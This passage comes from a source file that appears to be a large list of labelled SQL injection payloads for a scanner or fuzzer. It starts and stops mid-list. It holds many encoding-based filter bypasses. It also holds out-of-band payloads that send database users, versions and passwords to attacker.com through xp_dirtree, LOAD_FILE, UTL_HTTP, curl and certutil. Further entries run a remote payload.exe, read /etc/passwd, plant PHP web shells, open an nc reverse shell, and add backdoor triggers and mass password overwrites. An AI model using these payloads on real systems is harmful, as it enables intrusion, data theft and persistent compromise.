        ("'%20%4f%52%20%31%3d%31%20%2d%2d%20", "SQLi Hex Full2"),
        ("'%2520%254f%2552%2520%2531%253d%2531--", "SQLi Double Hex"),
        ("'%252520%254f%2552%252520%2531%253d%2531--", "SQLi Triple Hex"),
        ("'\\x20\\x4F\\x52\\x20\\x31\\x3D\\x31--", "SQLi Backslash Hex"),
        ("'\\x20\\x6f\\x72\\x20\\x31\\x3d\\x31--", "SQLi Backslash Hex Lower"),
        ("'\\u0020\\u004F\\u0052\\u0020\\u0031\\u003D\\u0031--", "SQLi Unicode Full"),
        ("'\\u0020\\u006f\\u0072\\u0020\\u0031\\u003d\\u0031--", "SQLi Unicode Lower"),
        ("'%u0020%u004F%u0052%u0020%u0031%u003D%u0031--", "SQLi Unicode URL Upper"),
        ("'%u0020%u006f%u0072%u0020%u0031%u003d%u0031--", "SQLi Unicode URL Lower"),
        ("'%EF%BC%87%20%EF%BC%AF%EF%BC%B2%20%EF%BC%91%EF%BC%9D%EF%BC%91--", "SQLi Fullwidth Upper"),
        ("'%EF%BD%87%20%EF%BD%AF%EF%BD%92%20%EF%BD%91%EF%BD%9D%EF%BD%91--", "SQLi Fullwidth Lower"),
        ("'%C2%A0OR%20C2%A01=1--", "SQLi NoBreak Space"),
        ("'%E2%80%85OR%E2%80%851=1--", "SQLi Quad Space"),
        ("'%E2%80%87OR%E2%80%871=1--", "SQLi Figure Space"),
        ("'%E2%80%89OR%E2%80%891=1--", "SQLi Thin Space"),
        ("'%E2%80%8BOR%E2%80%8B1=1--", "SQLi Zero Width Space"),
        ("'%E2%80%8EOR%E2%80%8E1=1--", "SQLi Left-Right Mark"),
        ("'%E2%80%8FOR%E2%80%8F1=1--", "SQLi Right-Left Mark"),
        ("'%E2%81%A0OR%E2%81%A01=1--", "SQLi Word Joiner"),
        ("'%E2%81%9FOR%E2%81%9F1=1--", "SQLi Function Apply"),
        ("'%E3%80%80OR%E3%80%801=1--", "SQLi Ideographic Space"),
        ("'%EF%BB%BFOR%EF%BB%BF1=1--", "SQLi ZWNBSP"),
        ("'%EF%BB%BF'%20OR%20'1'%20=%20'1'%EF%BB%BF", "SQLi BOM Bypass"),
        ("'%00'%20OR%20'1'%20=%20'1'%00--", "SQLi Null Byte Full"),
        ("'%00%00%00OR%00%00%001=1--", "SQLi Multiple Null"),
        ("'%01OR%011=1--", "SQLi SOH Bypass"),
        ("'%02OR%021=1--", "SQLi STX Bypass"),
        ("'%03OR%031=1--", "SQLi ETX Bypass"),
        ("'%04OR%041=1--", "SQLi EOT Bypass"),
        ("'%05OR%051=1--", "SQLi ENQ Bypass"),
        ("'%06OR%061=1--", "SQLi ACK Bypass"),
        ("'%07OR%071=1--", "SQLi BEL Bypass"),
        ("'%08OR%081=1--", "SQLi BS Bypass"),
        ("'%09OR%091=1--", "SQLi TAB Bypass"),
        ("'%0AOR%0A1=1--", "SQLi LF Bypass"),
        ("'%0BOR%0B1=1--", "SQLi VT Bypass"),
        ("'%0COR%0C1=1--", "SQLi FF Bypass"),
        ("'%0DOR%0D1=1--", "SQLi CR Bypass"),
        ("'%0EOR%0E1=1--", "SQLi SO Bypass"),
        ("'%0FOR%0F1=1--", "SQLi SI Bypass"),
        ("'%10OR%101=1--", "SQLi DLE Bypass"),
        ("'%11OR%111=1--", "SQLi DC1 Bypass"),
        ("'%12OR%121=1--", "SQLi DC2 Bypass"),
        ("'%13OR%131=1--", "SQLi DC3 Bypass"),
        ("'%14OR%141=1--", "SQLi DC4 Bypass"),
        ("'%15OR%151=1--", "SQLi NAK Bypass"),
        ("'%16OR%161=1--", "SQLi SYN Bypass"),
        ("'%17OR%171=1--", "SQLi ETB Bypass"),
        ("'%18OR%181=1--", "SQLi CAN Bypass"),
        ("'%19OR%191=1--", "SQLi EM Bypass"),
        ("'%1AOR%1A1=1--", "SQLi SUB Bypass"),
        ("'%1BOR%1B1=1--", "SQLi ESC Bypass"),
        ("'%1COR%1C1=1--", "SQLi FS Bypass"),
        ("'%1DOR%1D1=1--", "SQLi GS Bypass"),
        ("'%1EOR%1E1=1--", "SQLi RS Bypass"),
        ("'%1FOR%1F1=1--", "SQLi US Bypass"),
        ("'%7FOF%7F1=1--", "SQLi DEL Bypass"),
        ("'%80OR%801=1--", "SQLi PADDING80"),
        ("'%81OR%811=1--", "SQLi PADDING81"),
        ("'%82OR%821=1--", "SQLi PADDING82"),
        ("'%83OR%831=1--", "SQLi PADDING83"),
        ("'%84OR%841=1--", "SQLi PADDING84"),
        ("'%85OR%851=1--", "SQLi PADDING85"),
        ("'%86OR%861=1--", "SQLi PADDING86"),
        ("'%87OR%871=1--", "SQLi PADDING87"),
        ("'%88OR%881=1--", "SQLi PADDING88"),
        ("'%89OR%891=1--", "SQLi PADDING89"),
        ("'%8AOR%8A1=1--", "SQLi PADDING8A"),
        ("'%8BOR%8B1=1--", "SQLi PADDING8B"),
        ("'%8COR%8C1=1--", "SQLi PADDING8C"),
        ("'%8DOR%8D1=1--", "SQLi PADDING8D"),
        ("'%8EOR%8E1=1--", "SQLi PADDING8E"),
        ("'%8FOR%8F1=1--", "SQLi PADDING8F"),
        ("'%90OR%901=1--", "SQLi PADDING90"),
        ("'%91OR%911=1--", "SQLi PADDING91"),
        ("'%92OR%921=1--", "SQLi PADDING92"),
        ("'%93OR%931=1--", "SQLi PADDING93"),
        ("'%94OR%941=1--", "SQLi PADDING94"),
        ("'%95OR%951=1--", "SQLi PADDING95"),
        ("'%96OR%961=1--", "SQLi PADDING96"),
        ("'%97OR%971=1--", "SQLi PADDING97"),
        ("'%98OR%981=1--", "SQLi PADDING98"),
        ("'%99OR%991=1--", "SQLi PADDING99"),
        ("'%9AOR%9A1=1--", "SQLi PADDING9A"),
        ("'%9BOR%9B1=1--", "SQLi PADDING9B"),
        ("'%9COR%9C1=1--", "SQLi PADDING9C"),
        ("'%9DOR%9D1=1--", "SQLi PADDING9D"),
        ("'%9EOR%9E1=1--", "SQLi PADDING9E"),
        ("'%9FOR%9F1=1--", "SQLi PADDING9F"),
        
        # ==================== 721-820: OUT-OF-BAND (100 payload) ====================
        ("'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.attacker.com\\\\test'))--", "SQLi OOB MySQL LoadFile"),
        ("'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\test'))--", "SQLi OOB MySQL DB"),
        ("'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.attacker.com\\\\test'))--", "SQLi OOB MySQL User"),
        ("'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\test'))--", "SQLi OOB MySQL Password"),
        ("'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT table_name FROM information_schema.tables LIMIT 1),'.attacker.com\\\\test'))--", "SQLi OOB MySQL Table"),
        ("'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT column_name FROM information_schema.columns LIMIT 1),'.attacker.com\\\\test'))--", "SQLi OOB MySQL Column"),
        ("' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\test'))--", "SQLi OOB MySQL Union"),
        ("' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\test'))--", "SQLi OOB MySQL And"),
        ("' OR LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\test'))--", "SQLi OOB MySQL Or"),
        ("'; SELECT LOAD_FILE(CONCAT('\\\\\\\\(',(SELECT database()),'.attacker.com\\\\test'))--", "SQLi OOB MySQL Triple Slash"),
        ("'; SELECT LOAD_FILE(CONCAT(CHAR(92,92,92,92),(SELECT database()),'.attacker.com\\\\test'))--", "SQLi OOB MySQL Char"),
        ("'; SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT database()),'.attacker.com\\\\test'))--", "SQLi OOB MySQL Hex"),
        ("' INTO OUTFILE '\\\\attacker.com\\share\\out.txt'--", "SQLi OOB MySQL Outfile"),
        ("' INTO DUMPFILE '\\\\attacker.com\\share\\out.dump'--", "SQLi OOB MySQL Dumpfile"),
        
        # MSSQL OOB (14-40)
        ("'; DECLARE @q varchar(99);SET @q='\\\\attacker.com\\'+USER_NAME(); EXEC master..xp_dirtree @q--", "SQLi OOB MSSQL DirTree"),
        ("'; DECLARE @q varchar(99);SET @q='\\\\attacker.com\\'+DB_NAME(); EXEC master..xp_dirtree @q--", "SQLi OOB MSSQL DBName"),
        ("'; DECLARE @q varchar(99);SET @q='\\\\attacker.com\\'+@@VERSION; EXEC master..xp_dirtree @q--", "SQLi OOB MSSQL Version"),
        ("'; DECLARE @q varchar(99);SET @q='\\\\attacker.com\\'+(SELECT TOP 1 name FROM sysobjects); EXEC master..xp_dirtree @q--", "SQLi OOB MSSQL Table"),
        ("'; DECLARE @q varchar(99);SET @q='\\\\attacker.com\\'+(SELECT TOP 1 name FROM syscolumns); EXEC master..xp_dirtree @q--", "SQLi OOB MSSQL Column"),
        ("'; DECLARE @q varchar(99);SET @q='\\\\attacker.com\\'+SUSER_NAME(); EXEC master..xp_dirtree @q--", "SQLi OOB MSSQL SUser"),
        ("'; DECLARE @q varchar(99);SET @q='\\\\attacker.com\\'+HOST_NAME(); EXEC master..xp_dirtree @q--", "SQLi OOB MSSQL Host"),
        ("'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--", "SQLi OOB MSSQL Simple"),
        ("'; EXEC master..xp_fileexist '\\\\attacker.com\\share\\file.txt'--", "SQLi OOB MSSQL FileExist"),
        ("'; EXEC master..xp_subdirs '\\\\attacker.com\\share'--", "SQLi OOB MSSQL SubDirs"),
        ("'; EXEC master..xp_getfiledetails '\\\\attacker.com\\share\\file.txt'--", "SQLi OOB MSSQL FileDetails"),
        ("'; EXEC master..xp_cmdshell 'ping attacker.com'--", "SQLi OOB MSSQL CmdPing"),
        ("'; EXEC master..xp_cmdshell 'nslookup attacker.com'--", "SQLi OOB MSSQL NSLookup"),
        ("'; EXEC master..xp_cmdshell '\\attacker.com\\share\\payload.exe'--", "SQLi OOB MSSQL Execute"),
        ("'; DECLARE @t TABLE(data NVARCHAR(4000)); INSERT INTO @t EXEC master..xp_cmdshell 'whoami'; DECLARE @q NVARCHAR(4000); SELECT @q='\\\\attacker.com\\'+data FROM @t; EXEC master..xp_dirtree @q--", "SQLi OOB MSSQL Combined"),
        ("'; DECLARE @url VARCHAR(200); SET @url='\\\\attacker.com\\'+CONVERT(VARCHAR,(SELECT @@VERSION)); EXEC master..xp_dirtree @url--", "SQLi OOB MSSQL Convert"),
        ("'; DECLARE @url VARCHAR(200); SET @url='\\\\attacker.com\\'+master.dbo.fn_varbintohexstr(CAST(@@VERSION AS VARBINARY)); EXEC master..xp_dirtree @url--", "SQLi OOB MSSQL Hex"),
        ("'; DECLARE @c VARCHAR(1000); SELECT @c='\\\\attacker.com\\'+CONVERT(VARCHAR,DB_NAME())+'.txt'; EXEC xp_cmdshell 'type C:\\file.txt >> '+@c--", "SQLi OOB MSSQL Write"),
        ("'; DECLARE @p VARCHAR(200); SELECT @p='\\\\attacker.com\\share\\'+CONVERT(VARCHAR,GETDATE())+'.txt'; EXEC xp_cmdshell 'echo hacked > '+@p--", "SQLi OOB MSSQL Echo"),
        
        # PostgreSQL OOB (41-60)
        ("'; COPY (SELECT 1) TO PROGRAM 'nslookup attacker.com'--", "SQLi OOB PG CopyProgram"),
        ("'; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.com'--", "SQLi OOB PG CopyVersion"),
        ("'; COPY (SELECT current_database()) TO PROGRAM 'nslookup attacker.com'--", "SQLi OOB PG CopyDB"),
        ("'; COPY (SELECT current_user) TO PROGRAM 'nslookup attacker.com'--", "SQLi OOB PG CopyUser"),
        ("'; COPY (SELECT table_name FROM information_schema.tables LIMIT 1) TO PROGRAM 'nslookup attacker.com'--", "SQLi OOB PG CopyTable"),
        ("'; SELECT pg_read_file('/etc/passwd')--", "SQLi OOB PG ReadPasswd"),
        ("'; SELECT pg_read_binary_file('/etc/passwd')--", "SQLi OOB PG ReadBinary"),
        ("'; SELECT pg_ls_dir('/')--", "SQLi OOB PG ListRoot"),
        ("'; SELECT pg_ls_dir('./')--", "SQLi OOB PG ListCurrent"),
        ("'; SELECT pg_stat_file('/etc/passwd')--", "SQLi OOB PG StatFile"),
        ("'; SELECT lo_import('/etc/passwd')--", "SQLi OOB PG LOImport"),
        ("'; SELECT lo_export(lo_import('/etc/passwd'), '/tmp/out.txt')--", "SQLi OOB PG LOExport"),
        ("'; SELECT encode(convert_from(pg_read_binary_file('/etc/passwd'), 'UTF8'), 'base64')--", "SQLi OOB PG Base64"),
        ("'; CREATE TABLE oob(data TEXT); COPY oob FROM PROGRAM 'nslookup attacker.com'; DROP TABLE oob--", "SQLi OOB PG TempTable"),
        ("'; SELECT dblink_connect('host=attacker.com user=postgres password=pass dbname=test')--", "SQLi OOB PG Dblink"),
        ("'; SELECT dblink_connect_u('host=attacker.com user=postgres')--", "SQLi OOB PG DblinkU"),
        ("'; SELECT dblink_exec('host=attacker.com','SELECT 1')--", "SQLi OOB PG DblinkExec"),
        ("'; SELECT dblink('host=attacker.com','SELECT user')--", "SQLi OOB PG DblinkSelect"),
        ("'; SELECT * FROM dblink('host=attacker.com dbname=postgres','SELECT pg_sleep(3)') AS t(a INT)--", "SQLi OOB PG DblinkSleep"),
        ("'; SELECT pg_extension_config_dump('attacker.com', '')--", "SQLi OOB PG Extension"),
        
        # HTTP OOB (61-80)
        ("'; SELECT url_http('http://attacker.com/'||(SELECT user()))--", "SQLi OOB HTTP MySQL"),
        ("'; SELECT HTTP_GET('http://attacker.com/'||(SELECT database()))--", "SQLi OOB HTTP GET"),
        ("'; SELECT HTTP_POST('http://attacker.com/', (SELECT user()))--", "SQLi OOB HTTP POST"),
        ("'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--", "SQLi OOB Oracle HTTP"),
        ("'; SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)||'.attacker.com') FROM dual--", "SQLi OOB Oracle DNS"),
        ("'; SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80) FROM dual--", "SQLi OOB Oracle LDAP"),
        ("'; SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).getclob() FROM dual--", "SQLi OOB Oracle HTTPURI"),
        ("'; SELECT DBMS_LDAP.SIMPLE_BIND_S(DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com'),'cn=admin','pass') FROM dual--", "SQLi OOB Oracle LDAPBind"),
        ("'; SELECT XMLTYPE('<?xml version=\"1.0\"?><root><a href=\"http://attacker.com/'||(SELECT user FROM dual)||'\">test</a></root>') FROM dual--", "SQLi OOB Oracle XML"),
        ("'; SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1)) FROM dual--", "SQLi OOB Oracle Version"),
        
        # DNS OOB (81-100)
        ("'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.attacker.com\\\\test'))--", "SQLi OOB DNS MySQL"),
        ("'; EXEC xp_cmdshell 'nslookup '+(SELECT user_name())+'.attacker.com'--", "SQLi OOB DNS MSSQL"),
        ("'; EXEC xp_cmdshell 'ping '+(SELECT db_name())+'.attacker.com'--", "SQLi OOB Ping MSSQL"),
        ("'; EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/'+(SELECT @@VERSION)+' out.txt'--", "SQLi OOB Certutil"),
        ("'; EXEC xp_cmdshell 'bitsadmin /transfer n http://attacker.com/'+(SELECT user)+' %temp%\\out'--", "SQLi OOB Bitsadmin"),
        ("'; EXEC xp_cmdshell 'curl http://attacker.com/'+(SELECT @@VERSION)+''--", "SQLi OOB Curl"),
        ("'; EXEC xp_cmdshell 'wget http://attacker.com/'+(SELECT user_name())+''--", "SQLi OOB Wget"),
        ("'; EXEC xp_cmdshell 'powershell Invoke-WebRequest -Uri http://attacker.com/'+(SELECT @@VERSION)+''--", "SQLi OOB PowerShell"),
        ("'; EXEC master..xp_dirtree '\\\\'+(SELECT user_name())+'.attacker.com\\test'--", "SQLi OOB DNS MSSQL2"),
        ("'; SELECT pg_read_file('/etc/passwd') INTO PROGRAM 'nslookup attacker.com'--", "SQLi OOB DNS PG"),
        
        # ==================== 821-920: ADVANCED TECHNIQUES (100 payload) ====================
        # Second-order (1-20)
        ("admin'--", "SQLi Second-Order Register"),
        ("admin'#", "SQLi Second-Order Register Hash"),
        ("' UNION SELECT 'admin','pass'--", "SQLi Second-Order Union"),
        ("'; INSERT INTO users VALUES('newadmin','pass','admin')--", "SQLi Second-Order Injection"),
        ("<script>alert('XSS')</script>", "SQLi Second-Order XSS"),
        ("'; UPDATE users SET role='admin' WHERE username LIKE '%", "SQLi Second-Order Update"),
        ("'; UPDATE users SET password='pwned' WHERE 1=1--", "SQLi Second-Order MassUpdate"),
        ("'; CREATE TRIGGER backdoor AFTER INSERT ON users BEGIN INSERT INTO admin VALUES(NEW.username,'pass','admin'); END--", "SQLi Second-Order Trigger"),
        ("'; CREATE EVENT backdoor ON SCHEDULE EVERY 1 MINUTE DO EXEC xp_cmdshell('nc attacker.com 4444 -e cmd.exe')--", "SQLi Second-Order Event"),
        ("'; CREATE PROCEDURE backdoor AS EXEC xp_cmdshell('whoami')--", "SQLi Second-Order Proc"),
        ("'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--", "SQLi Second-Order EnableXPCmd2"),
        ("'; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--", "SQLi Second-Order Webshell"),
        ("'; SELECT '<?php eval($_POST[cmd]); ?>' INTO DUMPFILE '/var/www/html/shell.php'--", "SQLi Second-Order Webshell2"),
        ("'; SELECT '<?php echo shell_exec($_GET[cmd]); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.asp'--", "SQLi Second-Order ASP"),
        ("'; SELECT '<?php passthru($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--", "SQLi Second-Order Passthru"),
        ("'; SELECT '<?php system($_REQUEST[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--", "SQLi Second-Order Request"),
        ("'; SELECT '<?php exec($_GET[cmd],$o);print(implode(\"\\n\",$o));?>' INTO OUTFILE '/var/www/html/shell.php'--", "SQLi Second-Order Exec"),
        ("'; SELECT '<?php shell_exec($_SERVER[HTTP_USER_AGENT]);?>' INTO OUTFILE '/var/www/html/shell.php'--", "SQLi Second-Order UA"),
        ("'; SELECT '<?php file_put_contents(\"shell.php\",\"<?php system($_GET[cmd]);?>\");?>' INTO OUTFILE '/var/www/html/writer.php'--", "SQLi Second-Order Writer"),
        ("'; SELECT '<?php copy(\"http://attacker.com/shell.php\",\"shell.php\");?>' INTO OUTFILE '/var/www/html/downloader.php'--", "SQLi Second-Order Downloader"),
        
        # Logic-based (21-40)
        ("' OR 1=1 LIMIT 1--", "SQLi Logic Limit"),
        ("' OR 1=1 OFFSET 1--", "SQLi Logic Offset"),
        ("' OR 1=1 FETCH FIRST 1 ROWS ONLY--", "SQLi Logic Fetch"),
        ("' OR 1=1 FOR UPDATE--", "SQLi Logic ForUpdate"),
        ("' OR 1=1 LOCK IN SHARE MODE--", "SQLi Logic Lock"),
        ("' OR 1=1 PROCEDURE ANALYSE()--", "SQLi Logic Procedure"),
        ("' OR 1=1 INTO @a,@b--", "SQLi Logic Variables"),
        ("' OR 1=1 FOR XML PATH--", "SQLi Logic XML"),
        ("' OR 1=1 FOR JSON AUTO--", "SQLi Logic JSON"),
        ("' OR 1=1 OPTION (MAXDOP 1)--", "SQLi Logic Option"),
        ("' OR 1=1 WITH (NOLOCK)--", "SQLi Logic WithHint"),
        ("' OR 1=1 CROSS JOIN (SELECT 1) AS a--", "SQLi Logic CrossJoin"),
        ("' OR 1=1 INNER JOIN users ON 1=1--", "SQLi Logic InnerJoin"),
        ("' OR 1=1 LEFT JOIN users ON 1=1--", "SQLi Logic LeftJoin"),
        ("' OR 1=1 NATURAL JOIN users--", "SQLi Logic NaturalJoin"),
        ("' OR 1=1 STRAIGHT_JOIN users--", "SQLi Logic StraightJoin"),
        ("' OR 1=1 WHERE 1=1--", "SQLi Logic Where"),
        ("' OR 1=1 AND EXISTS(SELECT 1 FROM users)--", "SQLi Logic Exists2"),
        ("' OR 1=1 AND NOT EXISTS(SELECT 1 FROM users WHERE 1=2)--", "SQLi Logic NotExists"),
        ("' OR 1=1 AND (SELECT 1 FROM users WHERE 1=1 LIMIT 1)=1--", "SQLi Logic Subquery"),
        
        # String Manipulation (41-60)
        ("' OR CONCAT('a','b')='ab'--", "SQLi String Concat"),
        ("' OR CONCAT_WS('-','a','b')='a-b'--", "SQLi String ConcatWS"),
        ("' OR GROUP_CONCAT('a')='a'--", "SQLi String GroupConcat"),
        ("' OR REPEAT('a',3)='aaa'--", "SQLi String Repeat"),
        ("' OR REVERSE('abc')='cba'--", "SQLi String Reverse"),
        ("' || 'a'||'b'='ab'--", "SQLi String DoublePipe"),
        ("' | 'a' | 'b'='ab'--", "SQLi String Bitwise"),
        ("' & 'a' & 'b'='ab'--", "SQLi String BitwiseAnd"),
        ("' AND 'a'||'b'='ab'--", "SQLi String AndConcat"),
        ("' AND CONCAT_WS('', 'a', 'b')='ab'--", "SQLi String ConcatWS2"),
        ("' AND CONCAT(CONCAT('a','b'),'c')='abc'--", "SQLi String Nested"),
        ("' AND LOWER('TEST')='test'--", "SQLi String Lower"),
        ("' AND UPPER('test')='TEST'--", "SQLi String Upper"),
        ("' AND LCASE('TEST')='test'--", "SQLi String LCase"),
        ("' AND UCASE('test')='TEST'--", "SQLi String UCase"),
        ("' AND INSTR('test','e')=2--", "SQLi String Instr"),
        ("' AND LOCATE('e','test')=2--", "SQLi String Locate"),
        ("' AND POSITION('e' IN 'test')=2--", "SQLi String Position"),
        ("' AND SUBSTR('test',2,1)='e'--", "SQLi String Substr"),
        ("' AND SUBSTRING('test',2,1)='e'--", "SQLi String Substring2"),
        
        # Numeric Operations (61-80)
        ("' OR 1+1=2--", "SQLi Numeric Add"),
        ("' OR 2-1=1--", "SQLi Numeric Sub"),
        ("' OR 2*1=2--", "SQLi Numeric Mul"),
        ("' OR 2/1=2--", "SQLi Numeric Div"),
        ("' OR 2%1=0--", "SQLi Numeric Mod"),
        ("' OR 1<<1=2--", "SQLi Numeric LeftShift"),
        ("' OR 2>>1=1--", "SQLi Numeric RightShift"),
        ("' OR 1&1=1--", "SQLi Numeric BitAnd"),
        ("' OR 1|1=1--", "SQLi Numeric BitOr"),
        ("' OR 1^1=0--", "SQLi Numeric BitXor"),
        ("' OR ~1=-2--", "SQLi Numeric BitNot"),
        ("' OR POWER(2,3)=8--", "SQLi Numeric Power"),
        ("' OR SQRT(16)=4--", "SQLi Numeric Sqrt"),
        ("' OR ABS(-5)=5--", "SQLi Numeric Abs"),
        ("' OR CEIL(1.2)=2--", "SQLi Numeric Ceil"),
        ("' OR FLOOR(1.8)=1--", "SQLi Numeric Floor"),
        ("' OR ROUND(1.5)=2--", "SQLi Numeric Round"),
        ("' OR TRUNCATE(1.9,0)=1--", "SQLi Numeric Truncate"),
        ("' OR SIGN(5)=1--", "SQLi Numeric Sign"),
        ("' OR RAND()>=0--", "SQLi Numeric Rand"),
        
        # Date/Time (81-100)
        ("' OR NOW()=NOW()--", "SQLi Date Now"),
        ("' OR CURDATE()=CURDATE()--", "SQLi Date CurDate"),
        ("' OR CURTIME()=CURTIME()--", "SQLi Date CurTime"),
        ("' OR SYSDATE()=SYSDATE()--", "SQLi Date SysDate"),
        ("' OR CURRENT_DATE=CURRENT_DATE--", "SQLi Date CurrentDate"),
        ("' OR CURRENT_TIME=CURRENT_TIME--", "SQLi Date CurrentTime"),
        ("' OR CURRENT_TIMESTAMP=CURRENT_TIMESTAMP--", "SQLi Date CurrentTimestamp"),
        ("' OR LOCALTIMESTAMP=LOCALTIMESTAMP--", "SQLi Date LocalTimestamp"),
        ("' OR GETDATE()=GETDATE()--", "SQLi Date GetDate"),
        ("' OR GETUTCDATE()=GETUTCDATE()--", "SQLi Date GetUTCDate"),
        ("' OR SYSDATETIME()=SYSDATETIME()--", "SQLi Date SysDateTime"),
        ("' OR YEAR(NOW())=YEAR(NOW())--", "SQLi Date Year"),
        ("' OR MONTH(NOW())=MONTH(NOW())--", "SQLi Date Month"),
        ("' OR DAY(NOW())=DAY(NOW())--", "SQLi Date Day"),
        ("' OR HOUR(NOW())=HOUR(NOW())--", "SQLi Date Hour"),
        ("' OR MINUTE(NOW())=MINUTE(NOW())--", "SQLi Date Minute"),
        ("' OR SECOND(NOW())=SECOND(NOW())--", "SQLi Date Second"),
        ("' OR DATE_ADD(NOW(), INTERVAL 1 DAY)=DATE_ADD(NOW(), INTERVAL 1 DAY)--", "SQLi Date Add"),
        ("' OR DATE_SUB(NOW(), INTERVAL 1 DAY)=DATE_SUB(NOW(), INTERVAL 1 DAY)--", "SQLi Date Sub"),
        ("' OR DATEDIFF(NOW(), DATE_SUB(NOW(), INTERVAL 1 DAY))=1--", "SQLi Date Diff"),
        
        # ==================== 921-1000: COMPREHENSIVE COVERAGE (80 payload) ====================
        # Case Variations (1-20)
        ("' oR 1=1--", "SQLi Case Lower OR"),
        ("' Or 1=1--", "SQLi Case Title OR"),
        ("' oR '1'='1'--", "SQLi Case Lower String"),
        ("' aNd 1=1--", "SQLi Case Lower AND"),
        ("' AnD 1=1--", "SQLi Case Mixed AND"),
        ("' uNiOn SeLeCt NULL--", "SQLi Case Mixed Union"),
        ("' SeLeCt * FrOm users--", "SQLi Case Mixed Select"),
        ("' InSeRt InTo users--", "SQLi Case Mixed Insert"),
        ("' UpDaTe users--", "SQLi Case Mixed Update"),
        ("' DeLeTe FrOm users--", "SQLi Case Mixed Delete"),
        ("' DrOp TaBlE users--", "SQLi Case Mixed Drop"),
        ("' CrEaTe TaBlE backdoor--", "SQLi Case Mixed Create"),
        ("' AlTeR TaBlE users--", "SQLi Case Mixed Alter"),
        ("' ExEc xp_cmdshell--", "SQLi Case Mixed Exec"),
        ("' SlEeP(3)--", "SQLi Case Mixed Sleep"),
        ("' WaItFoR dElAy--", "SQLi Case Mixed WaitFor"),
        ("' BeNcHmArK--", "SQLi Case Mixed Benchmark"),
        ("' LoAd_FiLe--", "SQLi Case Mixed LoadFile"),
        ("' UnIoN aLl--", "SQLi Case Mixed UnionAll"),
        ("' iNfOrMaTiOn_ScHeMa--", "SQLi Case Mixed Schema"),
        
        # Parenthesis Variations (21-40)
        ("' OR (1=1)--", "SQLi Paren Single"),
        ("' OR ((1=1))--", "SQLi Paren Double"),
        ("' OR (((1=1)))--", "SQLi Paren Triple"),
        ("' OR (1=1) AND (2=2)--", "SQLi Paren Multiple"),
        ("' OR (1=1) OR (1=1)--", "SQLi Paren OR"),
        ("' OR (1=1) AND (1=2)--", "SQLi Paren Mixed"),
        ("' OR (SELECT 1 FROM (SELECT 1) AS a)=1--", "SQLi Paren Subquery"),
        ("' OR (1 IN (SELECT 1))--", "SQLi Paren IN"),
        ("' OR (EXISTS(SELECT 1))--", "SQLi Paren Exists"),
        ("' AND (1=1)--", "SQLi Paren AND"),
        ("' UNION (SELECT NULL)--", "SQLi Paren Union"),
        ("' UNION (SELECT NULL,NULL)--", "SQLi Paren Union2"),
        ("' OR (SELECT COUNT(*) FROM users)>0--", "SQLi Paren Count"),
        ("' OR (SELECT LENGTH(database()))>5--", "SQLi Paren Length"),
        ("' OR (SELECT ASCII(SUBSTRING((SELECT user()),1,1)))>100--", "SQLi Paren ASCII"),
        ("' OR (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)=1--", "SQLi Paren Case"),
        ("' OR (IF(1=1,1,0))=1--", "SQLi Paren IF"),
        ("' OR (SLEEP(3))='", "SQLi Paren Sleep"),
        ("' OR (pg_sleep(3)) IS NOT NULL--", "SQLi Paren PGSleep"),
        ("' OR (WAITFOR DELAY '0:0:3') IS NOT NULL--", "SQLi Paren WaitFor"),
        
        # Double Operations (41-60)
        ("' AND 1=1 AND 2=2--", "SQLi Double AND True"),
        ("' AND 1=1 AND 2=1--", "SQLi Double AND Mixed"),
        ("' AND 1=2 AND 2=2--", "SQLi Double AND False"),
        ("' OR 1=1 OR 2=2--", "SQLi Double OR True"),
        ("' OR 1=1 OR 2=1--", "SQLi Double OR Mixed"),
        ("' OR 1=2 OR 2=2--", "SQLi Double OR True2"),
        ("' AND 1=1 OR 2=2--", "SQLi Mixed AND OR"),
        ("' OR 1=1 AND 2=2--", "SQLi Mixed OR AND"),
        ("' AND (1=1 OR 2=2)--", "SQLi Paren Mixed2"),
        ("' OR (1=1 AND 2=2)--", "SQLi Paren Mixed3"),
        ("' AND 1=1 AND 'a'='a'--", "SQLi Triple True"),
        ("' AND 1=1 AND 'a'='a' AND 2=2--", "SQLi Quad True"),
        ("' OR 1=1 OR 2=2 OR 3=3--", "SQLi Triple OR"),
        ("' AND 1=1 OR 2=1 AND 3=3--", "SQLi Complex Logic"),
        ("' AND (1=1 OR 2=1) AND 3=3--", "SQLi Complex Paren"),
        ("' OR (1=1 AND 2=1) OR 3=3--", "SQLi Complex Paren2"),
        ("' AND 1=1 AND (2=2 OR 3=3)--", "SQLi Complex Paren3"),
        ("' OR 1=1 OR (2=2 AND 3=3)--", "SQLi Complex Paren4"),
        ("' AND ((1=1)) OR ((2=2))--", "SQLi Double Paren Mixed"),
        ("' OR ((1=1)) AND ((2=2))--", "SQLi Double Paren Mixed2"),
        
        # Combined Techniques (61-80)
